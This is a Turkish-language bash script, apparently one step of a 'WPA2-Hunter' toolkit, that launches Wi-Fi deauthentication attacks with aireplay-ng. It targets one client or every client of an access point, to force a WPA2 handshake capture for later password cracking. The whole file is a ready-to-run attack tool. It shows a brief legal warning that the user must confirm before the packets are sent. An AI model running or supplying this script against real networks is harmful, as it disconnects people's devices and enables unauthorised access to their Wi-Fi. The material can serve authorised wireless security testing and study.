#!/bin/bash

# WPA2-Hunter - Deauthentication Saldırısı Scripti
# İstemciyi bağlantıdan düşürerek handshake tetikler

set -e

echo "================================================"
echo "   WPA2-Hunter - Deauth Saldırısı"
echo "================================================"
echo ""

# Root kontrolü
if [ "$EUID" -ne 0 ]; then
    echo "[!] Bu script root yetkileri gerektirir!"
    echo "    Kullanım: sudo $0"
    exit 1
fi

# Monitor interface tespit
if [ -f /tmp/wpa2hunter_interface.conf ]; then
    MON_INTERFACE=$(cat /tmp/wpa2hunter_interface.conf)
    echo "[*] Monitor interface: $MON_INTERFACE"
else
    read -p "[?] Monitor interface (örn: wlan0mon): " MON_INTERFACE
fi

echo ""
echo "⚠️  ETİK VE YASAL UYARI"
echo "───────────────────────────────────────────────"
echo "Bu saldırı, ağa bağlı cihazların bağlantısını"
echo "geçici olarak keser. Yalnızca:"
echo "  - Kendi ağınızda"
echo "  - Yazılı izniniz olan ağlarda"
echo "kullanın. İzinsiz kullanım YASA DIŞIDIR!"
echo "───────────────────────────────────────────────"
echo ""

read -p "[?] Yasal ve etik sorumluluğu kabul ediyor musunuz? (EVET/hayir): " CONFIRM

if [ "$CONFIRM" != "EVET" ]; then
    echo "[!] İşlem iptal edildi."
    exit 0
fi

echo ""

# Kaydedilmiş hedef var mı?
if [ -f /tmp/wpa2hunter_target_bssid.conf ]; then
    SAVED_BSSID=$(cat /tmp/wpa2hunter_target_bssid.conf)
    echo "[*] Kaydedilmiş hedef bulundu: $SAVED_BSSID"
    read -p "[?] Bu hedefi kullanmak istiyor musunuz? (e/h): " USE_SAVED
    
    if [ "$USE_SAVED" = "e" ] || [ "$USE_SAVED" = "E" ]; then
        TARGET_BSSID="$SAVED_BSSID"
    fi
fi

# Manuel hedef belirleme
if [ -z "$TARGET_BSSID" ]; then
    read -p "[?] Hedef BSSID (AP MAC): " TARGET_BSSID
fi

echo ""
echo "Saldırı Tipi Seçimi:"
echo "  1) Belirli bir istemciyi hedefle (önerilen)"
echo "  2) Tüm istemcilere broadcast deauth"
echo ""
read -p "[?] Seçiminiz (1/2): " ATTACK_TYPE

if [ "$ATTACK_TYPE" = "1" ]; then
    read -p "[?] İstemci MAC adresi (STATION): " CLIENT_MAC
    DEAUTH_CMD="--deauth 10 -a $TARGET_BSSID -c $CLIENT_MAC"
    TARGET_INFO="AP: $TARGET_BSSID → İstemci: $CLIENT_MAC"
else
    read -p "[?] Kaç adet deauth paketi gönderilsin? (varsayılan 5): " DEAUTH_COUNT
    DEAUTH_COUNT=${DEAUTH_COUNT:-5}
    DEAUTH_CMD="--deauth $DEAUTH_COUNT -a $TARGET_BSSID"
    TARGET_INFO="AP: $TARGET_BSSID (Tüm istemciler)"
fi

echo ""
echo "🎯 Saldırı Parametreleri:"
echo "   $TARGET_INFO"
echo "   Interface: $MON_INTERFACE"
echo ""
echo "⏳ Deauth paketleri gönderiliyor..."
echo ""

# Saldırıyı başlat
aireplay-ng $DEAUTH_CMD "$MON_INTERFACE"

echo ""
echo "[*] Deauth saldırısı tamamlandı."
echo ""
echo "💡 Sonraki Adımlar:"
echo "   1) Handshake yakalama scripti çalışıyorsa, ekranda kontrol edin"
echo "   2) Sağ üst köşede 'WPA handshake' mesajını arayın"
echo "   3) Eğer yakalanmadıysa, bu saldırıyı tekrarlayın"
echo ""
echo "🔄 Saldırıyı tekrarlamak için:"
echo "    ./04-deauth-attack.sh"
echo ""
